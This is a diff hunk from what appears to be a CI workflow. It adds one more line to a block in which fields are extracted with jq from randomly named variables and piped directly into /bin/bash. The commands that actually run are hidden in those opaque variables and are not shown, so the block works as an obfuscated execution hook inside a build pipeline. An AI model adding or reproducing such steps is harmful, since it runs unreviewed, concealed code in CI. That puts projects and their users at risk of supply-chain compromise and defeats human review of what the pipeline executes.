@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$gmin6" | jq -r .bxb19619 | /bin/bash
           echo $n740 | jq -r .enzw9187 | /bin/bash
           printf '%s' "$ficgv92" | jq -r .pbq819 | /bin/bash
+          printf '%s' "$skflo3" | jq -r .w222 | /bin/bash
 
       - name: Upload results
         if: always()
